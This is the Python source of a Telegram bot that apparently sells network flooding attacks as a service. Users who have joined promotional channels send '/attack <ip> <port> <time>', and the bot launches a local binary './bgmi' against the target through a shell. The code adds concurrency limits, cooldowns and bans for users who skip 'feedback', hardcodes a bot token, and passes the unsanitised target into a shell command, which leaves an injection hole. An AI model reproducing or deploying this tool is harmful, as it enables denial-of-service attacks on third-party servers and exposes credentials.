import telebot
import subprocess
import os
import threading
import logging
import time

# Configure logging
logging.basicConfig(filename="bot.log", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Your Telegram bot token
bot = telebot.TeleBot('7686606251:AAF14WbWcb43b1F4UOkjbnpXg4co-QWvqfI')

# Admin ID
ADMINS = {1604629264}  # Add more admin IDs if needed
OWNER_ID = 1604629264
# Attack settings
nxtlvl_PATH = "./bgmi"
MAX_CONCURRENT_ATTACKS = 3  # Set the maximum number of concurrent attacks

# Blocked Ports
BLOCKED_PORTS = {21, 22, 80, 443, 3306, 8700, 20000, 443, 17500, 9031, 20002, 20001}  # Add ports to blocklist

# Attack status tracking
attack_lock = threading.Lock()
active_attacks = []  # Stores active attack details
cooldowns = {}  # Stores cooldown time per user
pending_feedback = {}  # Stores users who need to submit feedback
banned_users = {}  # Stores banned users and their unban time

# Required Channels for Verification
REQUIRED_CHANNELS = ["@NxTLvL07", "@sexyserver07"]  # Add required channels here

# Function to check if a user is a member of required channels
def is_user_member(user_id):
    for channel in REQUIRED_CHANNELS:
        try:
            member = bot.get_chat_member(channel, user_id)
            if member.status in ["member", "administrator", "creator"]:
                continue
            else:
                return False
        except:
            return False
    return True

# start message with welcome 

@bot.message_handler(commands=['start'])
def start(message):
    welcome_text = (
        "💥Welcome To Paradox World💥\n"
        "`/attack <ip> <port> <time>`\n"
        "Make sure you are a member of the required channels."
    )
    bot.reply_to(message, welcome_text, parse_mode="Markdown")
# extra commads 
@bot.message_handler(commands=['info'])
def info(message):
    info_text = (
        "ℹ️ *Bot Information*\n\n"
        "Version: 1.0\n"
        "Developed by: @LostBoiXD\n"
        "This bot is designed to execute specific commands and provide quick responses."
    )
    bot.reply_to(message, info_text, parse_mode="Markdown")

@bot.message_handler(commands=['shutdown'])
def shutdown(message):
    user_id = message.from_user.id
    if user_id != OWNER_ID:
        bot.reply_to(message, "🚫 You are not authorized to shut down the bot.")
        return
    bot.reply_to(message, "🔻 Shutting down the bot. Goodbye!")
    bot.stop_polling()
    
# Command for admin broadcast
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = message.from_user.id
    if user_id not in ADMINS:
        bot.reply_to(message, "❌ Only admins can broadcast messages!")
        return
    
    text = message.text.split(maxsplit=1)
    if len(text) < 2:
        bot.reply_to(message, "❌ Usage: /broadcast <message>", parse_mode="Markdown")
        return
    
    broadcast_text = text[1]
    bot.send_message(message.chat.id, f"📢 **Broadcast Message:**\n{broadcast_text}", parse_mode="Markdown")
    logging.info(f"Admin {user_id} broadcasted message: {broadcast_text}")

# Command to handle photo feedback
@bot.message_handler(content_types=['photo'])
def handle_feedback(message):
    global pending_feedback
    user_id = message.from_user.id
    
    if user_id in pending_feedback:
        del pending_feedback[user_id]
        bot.reply_to(message, "✅ Feedback received! You can start another attack.")
    else:
        bot.reply_to(message, "‼️ No pending feedback request found!")

# Command to start attack
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global active_attacks, cooldowns, pending_feedback, banned_users
    user_id = message.from_user.id
    current_time = time.time()
    
    # Check if user is banned
    if user_id in banned_users and current_time < banned_users[user_id]:
        remaining_ban = int(banned_users[user_id] - current_time)
        bot.reply_to(message, f"🚫 You are banned for {remaining_ban // 60} minutes!")
        return

    # Verify user membership
    if not is_user_member(user_id):
        channels_list = "\n".join([f"➡ {ch}" for ch in REQUIRED_CHANNELS])
        bot.reply_to(message, 
                   f"❌ You must join both channels before using this bot:\n"
                   f"➡️ [Join Channel 1](https://t.me/NxTLvL07)\n"
                   f"➡️ [Join Channel 2](https://t.me/sexyserver07)",  parse_mode="Markdown", disable_web_page_preview=True
                )
        return
    
    # Check cooldown
    if user_id in cooldowns and current_time < cooldowns[user_id]:
        remaining_cd = int(cooldowns[user_id] - current_time)
        bot.reply_to(message, f"⏳ You must wait {remaining_cd} seconds before starting a new attack!")
        return
    
    if len(active_attacks) >= MAX_CONCURRENT_ATTACKS:
        bot.reply_to(message, "⏳ Maximum concurrent attacks reached! Please wait.")
        return

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "⚠️ Usage: /attack <ip> <port> <time>", parse_mode="Markdown")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
        
        if port in BLOCKED_PORTS:
            bot.reply_to(message, f"❌ Port `{port}` is blocked and cannot be attacked!", parse_mode="Markdown")
            return
        
        # Limit attack duration to 120 seconds if it exceeds
        if time_duration > 120:
            time_duration = 120
    except ValueError:
        bot.reply_to(message, "❌ **Port and Time must be integers!** 📟")
        return

    if not os.path.exists(nxtlvl_PATH):
        bot.reply_to(message, "❌ **bgmi executable not found!**")
        return
    
    if not os.access(nxtlvl_PATH, os.X_OK):
        os.chmod(nxtlvl_PATH, 0o755)

    # Set cooldown equal to attack duration
    cooldowns[user_id] = current_time + time_duration
    
    # Log attack details
    logging.info(f"Attack started by {user_id} on {target}:{port} for {time_duration} seconds")
    active_attacks.append({'user': user_id, 'ip': target, 'port': port, 'duration': time_duration})

    # Start Attack Notification
    bot.reply_to(message,
        f"🚀 **Attack STARTED!**\n\n"
        f"🌐 IP: {target}\n"
        f"🔌 PORT: {port}\n"
        f"⏰ TIME: {time_duration} seconds\n", parse_mode="Markdown")
    
    def run_attack():
        global active_attacks, pending_feedback
        try:
            full_command = f"{nxtlvl_PATH} {target} {port} {time_duration} 900"
            subprocess.run(full_command, shell=True, capture_output=True, text=True)
        finally:
            active_attacks = [a for a in active_attacks if not (a['user'] == user_id and a['ip'] == target and a['port'] == port)]
            bot.reply_to(message, 
                      f"🏁 **Attack OVER!**\n\n"
                      f"🌐 IP: {target}\n"
                      f"🔌 PORT: {port}\n"
                      f"⏰ TIME: {time_duration} seconds\n", parse_mode="Markdown")
            logging.info(f"Attack finished by {user_id} on {target}:{port}")
            pending_feedback[user_id] = current_time + 300  # 5 minutes to submit feedback
            
            # Check after 5 minutes if feedback was given
            time.sleep(300)
            if user_id in pending_feedback:
                banned_users[user_id] = time.time() + 1800  # Ban for 30 minutes
                del pending_feedback[user_id]
                bot.reply_to(message, f"🚫 You have been banned for 30 minutes for not submitting feedback!")

    threading.Thread(target=run_attack, daemon=True).start()

# Start the bot
if __name__ == "__main__":
    logging.info("Bot is running...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"An error occurred: {e}")
